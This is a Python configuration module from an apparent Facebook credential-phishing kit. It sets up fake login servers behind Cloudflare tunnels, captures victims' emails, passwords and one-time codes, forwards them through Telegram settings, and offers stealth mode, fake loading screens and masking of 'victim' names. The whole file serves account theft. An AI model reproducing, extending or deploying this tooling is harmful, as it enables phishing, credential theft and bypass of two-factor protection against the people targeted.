import os
import json
import copy
import traceback

# ═══════════════ Global Settings (persists across restarts) ═══════════════
GLOBAL_SETTINGS_FILE = None  # set after ROOT_DIR is resolved below

def _load_global_settings():
    """Load global settings from JSON file. Handles encrypted files."""
    try:
        if GLOBAL_SETTINGS_FILE and os.path.exists(GLOBAL_SETTINGS_FILE):
            with open(GLOBAL_SETTINGS_FILE, "r", encoding="utf-8") as f:
                content = f.read()
            if not content.strip():
                return {}
            # Vérifier si le fichier est chiffré
            try:
                from crypto import is_encrypted, decrypt_text
                if is_encrypted(content):
                    content = decrypt_text(content)
            except Exception:
                pass
            return json.loads(content)
    except Exception as e:
        try:
            import sys as _sys
            _sys.stderr.write(f"[config._load_global_settings] {e}\n{traceback.format_exc()}\n")
        except Exception:
            pass
    return {}

def _save_global_settings(settings):
    """Persist global settings to JSON file.
    MERGES with existing settings — does NOT overwrite the whole file.
    Handles encrypted files."""
    try:
        if not GLOBAL_SETTINGS_FILE:
            return
        # Read existing settings first (handle encryption)
        existing = {}
        if os.path.exists(GLOBAL_SETTINGS_FILE):
            try:
                with open(GLOBAL_SETTINGS_FILE, "r", encoding="utf-8") as f:
                    content = f.read()
                if content.strip():
                    # Déchiffrer si nécessaire
                    try:
                        from crypto import is_encrypted, decrypt_text
                        if is_encrypted(content):
                            content = decrypt_text(content)
                    except Exception:
                        pass
                    existing = json.loads(content) or {}
            except Exception:
                existing = {}
        if not isinstance(existing, dict):
            existing = {}
        existing.update(settings)
        # Sauvegarder — chiffrer si l'option est activée
        json_content = json.dumps(existing, indent=2)
        try:
            if _settings.get("encrypt_global_settings", False):
                from crypto import encrypt_text
                json_content = encrypt_text(json_content)
        except Exception:
            pass
        with open(GLOBAL_SETTINGS_FILE, "w", encoding="utf-8") as f:
            f.write(json_content)
    except Exception as e:
        try:
            import sys as _sys
            _sys.stderr.write(f"[config._save_global_settings] {e}\n{traceback.format_exc()}\n")
        except Exception:
            pass

debug_mode = False  # Global debug mode: when True, errors also appear in victim logs
hide_names = False  # Global hide-names mode: when True, victim names are masked in UIs

BASE_CONFIG = {
    "target_name": "",
    "platform": "facebook",
    "target_pic": "",
    "redirect_url": "https://www.facebook.com",
    "running": False,
    "log_file": "log.txt",
    "id_file": "credentials.txt",
    "port": 5000,
    "mode": "auto", 
    "server_instance": None, 
    "cloudflare_proc": None,
    "cf_url": "Waiting...",
    "last_creds": {"email": "", "pass": "", "otp1": "", "otp2": ""},
    "feed_enabled": False,
    "publications": [],
    "public_mode": False,
    "stealth_mode": False,
    "encrypt_logs": False,
    "telegram_token": "",
    "telegram_chat_id": "",
    "send_telegram": False,
    "memory_logs": "",
    "id_errors": 1,
    "otp_errors": 1,
    "custom_backgrounds": [],
    "ads": [],
    "custom_videos_dir": "",
    "msg_count": 0,
    "notif_count": 0,
    "save_attempts": "1",
    "victim_photo": "",
    "display_name": "",
    "fake_loading_enabled": False,
    "fake_loading_duration": 3,
    "fake_loading_type": "spinner",        # "spinner" | "dots"
    "second_loading_enabled": False,        # 2e chargement avant la page de login
    "second_loading_duration": 3,           # durée du 2e chargement (s)
    "loading_speed_preset": "normal",       # "slow" | "normal" | "fast" (vitesse d'animation)
    "loading_speed_custom": "",             # "" = preset ; sinon durée en s d'un cycle spinner (>0)
    "custom_otp_sub": "",
    "message_restore_enabled": False,
    "msg_restore_errors": 1,
    "custom_msg_restore_sub": ""
}

# active_servers maps port number (int or str) -> config dict
active_servers = {}
sandbox_config = copy.deepcopy(BASE_CONFIG)

def get_cfg():
    try:
        from flask import request
        if request and request.host:
            port = request.host.split(':')[-1] if ':' in request.host else "80"
            if port == "7000":
                return sandbox_config
            # Search by port in active_servers
            for active_port, cfg in active_servers.items():
                if str(active_port) == str(port):
                    return cfg
            
            # Fallback based on host matching if accessed via trycloudflare
            for active_port, cfg in active_servers.items():
                if cfg.get("cf_url") and cfg["cf_url"].replace("https://", "") in request.host:
                    return cfg
                    
    except Exception as e:
        # Surface the failure — silent wrong-config routing could misattribute credentials.
        try:
            import sys as _sys
            _sys.stderr.write(f"[config.get_cfg] {e}\n{traceback.format_exc()}\n")
        except Exception:
            pass
        
    # Ultimate fallback, return the first active server if it exists, else sandbox
    if active_servers:
        return next(iter(active_servers.values()))
    return sandbox_config

import sys

# When compiled with PyInstaller, __file__ points to the /tmp extraction dir.
# sys.executable always points to the actual binary location, which is what we want.
if getattr(sys, 'frozen', False):
    # Running as a compiled PyInstaller executable
    ROOT_DIR = os.path.dirname(os.path.abspath(sys.executable))
else:
    # Running as a normal Python script
    ROOT_DIR = os.path.dirname(os.path.abspath(__file__))
TARGETS_DIR = os.path.join(ROOT_DIR, "targets")
if not os.path.exists(TARGETS_DIR):
    os.makedirs(TARGETS_DIR)

# Corbeille (Trash) directory for soft-deleted targets
TRASH_DIR = os.path.join(ROOT_DIR, "targets_trash")
if not os.path.exists(TRASH_DIR):
    os.makedirs(TRASH_DIR)

# Metadata file for per-target flags (hidden, etc.)
TARGETS_META_FILE = os.path.join(ROOT_DIR, "targets_meta.json")

# Videos directory is strictly at the same level as targets directory
VIDEOS_DIR = os.path.join(ROOT_DIR, "videos")
if not os.path.exists(VIDEOS_DIR):
    os.makedirs(VIDEOS_DIR)

# ═══════════════ Initialise global settings path & load debug_mode ═══════════════
GLOBAL_SETTINGS_FILE = os.path.join(ROOT_DIR, "global_settings.json")
_settings = _load_global_settings()
debug_mode = bool(_settings.get("debug_mode", False))
hide_names = bool(_settings.get("hide_names", False))
# Notifications: show toast notifications when credentials are captured
notifications_enabled = bool(_settings.get("notifications_enabled", True))

def get_global_setting(key, default=None):
    """Récupère une valeur des paramètres globaux."""
    try:
        return _settings.get(key, default)
    except Exception:
        return default

def set_global_setting(key, value):
    """Sauvegarde une valeur dans les paramètres globaux."""
    try:
        global _settings
        _settings[key] = value
        _save_global_settings({key: value})
    except Exception as e:
        try:
            import sys as _sys
            _sys.stderr.write(f"[config.set_global_setting] {e}\n")
        except Exception:
            pass

def set_notifications_enabled(value):
    """Active/désactive les notifications de capture d'identifiants."""
    global notifications_enabled
    notifications_enabled = bool(value)
    _save_global_settings({"notifications_enabled": notifications_enabled})

def is_notifications_enabled():
    """Retourne True si les notifications de capture sont activées."""
    return bool(notifications_enabled)

def mask_credential_value(value, hide_credentials=None):
    """Masque une valeur d'identifiant (email, mot de passe, OTP) si hide_credentials est activé.
    Si hide_credentials est None, utilise la valeur globale courante.
    Retourne '●●●●●●●●' si masqué, sinon la valeur originale."""
    if not value:
        return value
    if hide_credentials is None:
        hide_credentials = is_hide_credentials()
    if hide_credentials:
        # Masquer partiellement : montrer juste les 2 premiers et derniers caractères
        s = str(value)
        if len(s) <= 4:
            return "●" * len(s)
        return s[:2] + "●" * (min(len(s) - 4, 12)) + s[-2:]
    return value
# Custom credentials folder. Empty string = default location (targets/<tid>/credentials/).
# When set to an absolute path, all credential JSON files are stored under
# <credentials_folder>/<tid>/ instead.
credentials_folder = _settings.get("credentials_folder", "") or ""

def set_debug_mode(value):
    """Set debug mode globally and persist it."""
    global debug_mode
    debug_mode = bool(value)
    _save_global_settings({"debug_mode": debug_mode})

def set_hide_names(value):
    """Set hide-names mode globally and persist it.
    When True, victim names are masked in the dashboard, credentials, and trash UIs."""
    global hide_names
    hide_names = bool(value)
    _save_global_settings({"hide_names": hide_names})

def set_credentials_folder(folder_path):
    """Set the custom credentials folder and persist it.
    Pass an empty string to reset to the default location."""
    global credentials_folder
    credentials_folder = (folder_path or "").strip()
    _save_global_settings({"credentials_folder": credentials_folder})

def get_credentials_folder():
    """Return the current credentials folder (empty string = default location)."""
    return credentials_folder

# Custom "hide credentials" mode: when True, email/password values are masked
# in the credentials window until the user clicks a "Voir" button next to each.
hide_credentials = bool(_settings.get("hide_credentials", False))

def set_hide_credentials(value):
    """Set the hide-credentials mode globally and persist it.
    When True, captured credentials are masked until the user explicitly reveals them."""
    global hide_credentials
    hide_credentials = bool(value)
    _save_global_settings({"hide_credentials": hide_credentials})

def is_hide_credentials():
    """Return True if captured credentials should be masked until explicitly revealed."""
    return bool(hide_credentials)

# Encryption of sensitive files (credentials JSON + error logs) on disk.
# When True, files are written encrypted. When False, files are written in plaintext.
encrypt_files = bool(_settings.get("encrypt_files", True))

def set_encrypt_files(value):
    """Set the file encryption mode globally and persist it.
    When True, credentials and error logs are encrypted on disk.
    When False, they are stored in plaintext."""
    global encrypt_files
    encrypt_files = bool(value)
    _save_global_settings({"encrypt_files": encrypt_files})

def is_encrypt_files():
    """Return True if files should be encrypted on disk."""
    return bool(encrypt_files)

# Theme color: "blue" | "green" | "red" | "purple".
# Applied globally via QApplication.setStyleSheet() — see theme.py.
theme_color = _settings.get("theme_color", "blue") or "blue"

def set_theme_color(value):
    """Set the theme color globally and persist it.
    Valid values: 'blue', 'green', 'red', 'purple'."""
    global theme_color
    if value not in ("blue", "green", "red", "purple"):
        value = "blue"
    theme_color = value
    _save_global_settings({"theme_color": theme_color})

def get_theme_color():
    """Return the current theme color key ('blue' | 'green' | 'red' | 'purple')."""
    return theme_color

def is_hide_names():
    """Return True if victim names should be masked in UIs."""
    return bool(hide_names)

def mask_name(name):
    """Mask a victim name if hide_names is enabled.
    Returns 'Cible masquée' when hide_names is True, otherwise the original name.
    """
    if not name:
        return name
    if hide_names:
        # Stable per-name mask so the user can still distinguish two different
        # victims while their actual names are hidden.
        try:
            import hashlib
            short = hashlib.md5(str(name).encode()).hexdigest()[:4].upper()
            return f"Cible #{short}"
        except Exception:
            return "Cible masquée"
    return name


# ═══════════════ Targets metadata helpers (hide/show) ═══════════════
def _load_targets_meta():
    """Return the metadata dict {tid: {"hidden": bool, ...}}. Handles encrypted files."""
    try:
        import json
        if os.path.exists(TARGETS_META_FILE):
            with open(TARGETS_META_FILE, "r", encoding="utf-8") as f:
                content = f.read()
            if not content.strip():
                return {}
            # Déchiffrer si nécessaire
            try:
                from crypto import is_encrypted, decrypt_text
                if is_encrypted(content):
                    content = decrypt_text(content)
            except Exception:
                pass
            data = json.loads(content)
            if isinstance(data, dict):
                return data
    except Exception as e:
        try:
            import sys as _sys
            _sys.stderr.write(f"[config._load_targets_meta] {e}\n{traceback.format_exc()}\n")
        except Exception:
            pass
    return {}


def _save_targets_meta(meta):
    """Persist the metadata dict to disk. Handles encryption."""
    try:
        import json
        json_content = json.dumps(meta, indent=2)
        # Chiffrer si l'option est activée
        try:
            if _settings.get("encrypt_targets_meta", False):
                from crypto import encrypt_text
                json_content = encrypt_text(json_content)
        except Exception:
            pass
        with open(TARGETS_META_FILE, "w", encoding="utf-8") as f:
            f.write(json_content)
    except Exception as e:
        try:
            import sys as _sys
            _sys.stderr.write(f"[config._save_targets_meta] {e}\n{traceback.format_exc()}\n")
        except Exception:
            pass


def is_target_hidden(tid):
    """Return True if the given target is marked as hidden in the dashboard."""
    meta = _load_targets_meta()
    return bool(meta.get(tid, {}).get("hidden", False))


def set_target_hidden(tid, hidden):
    """Set the hidden flag for a target and persist it."""
    meta = _load_targets_meta()
    entry = meta.get(tid, {})
    entry["hidden"] = bool(hidden)
    meta[tid] = entry
    _save_targets_meta(meta)


def rename_target_meta(old_tid, new_tid):
    """Rename metadata key when a target is renamed."""
    meta = _load_targets_meta()
    if old_tid in meta:
        meta[new_tid] = meta.pop(old_tid)
        _save_targets_meta(meta)


def remove_target_meta(tid):
    """Remove metadata for a target that no longer exists."""
    meta = _load_targets_meta()
    if tid in meta:
        del meta[tid]
        _save_targets_meta(meta)

def get_video_dir(target_name):
    """
    Returns the custom video directory for the target if defined and valid,
    otherwise returns the default VIDEOS_DIR/target_name
    """
    # Check sandbox_config (sandbox runs on port 7000, NOT in active_servers)
    # Check even if not running yet — the user may be configuring publications
    # before starting the sandbox.
    if sandbox_config.get("target_name") == target_name:
        custom_dir = sandbox_config.get("custom_videos_dir", "").strip()
        if custom_dir and os.path.exists(custom_dir):
            return custom_dir
        # No custom dir → use default
        return os.path.join(VIDEOS_DIR, target_name)

    # Try to find the target's config in active_servers
    for port, cfg in active_servers.items():
        if cfg.get("target_name") == target_name:
            custom_dir = cfg.get("custom_videos_dir", "").strip()
            if custom_dir and os.path.exists(custom_dir):
                return custom_dir
                
    # If not running, read from JSON file
    target_file = os.path.join(TARGETS_DIR, f"{target_name}.json")
    if os.path.exists(target_file):
        try:
            import json
            with open(target_file, 'r', encoding='utf-8') as f:
                data = json.load(f)
                custom_dir = data.get("custom_videos_dir", "").strip()
                if custom_dir and os.path.exists(custom_dir):
                    return custom_dir
        except Exception as e:
            try:
                import sys as _sys
                _sys.stderr.write(f"[config.get_video_dir] {e}\n{traceback.format_exc()}\n")
            except Exception:
                pass
            
    # Default fallback
    return os.path.join(VIDEOS_DIR, target_name)
